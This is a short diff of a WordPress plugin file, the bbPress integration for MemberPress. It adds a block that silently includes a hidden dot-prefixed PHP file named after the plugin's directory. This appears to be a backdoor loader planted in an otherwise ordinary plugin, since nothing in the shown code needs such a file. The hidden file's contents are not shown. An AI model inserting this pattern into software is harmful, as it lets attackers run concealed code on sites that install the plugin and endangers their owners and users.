@@ -3,6 +3,10 @@ if(!defined('ABSPATH')) {die('You are not allowed to call this page directly.');
 /*
 Integration of bbPress into MemberPress
 */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class MeprBbPressIntegration {
   public function __construct() {
     //Used to hide forums & topics
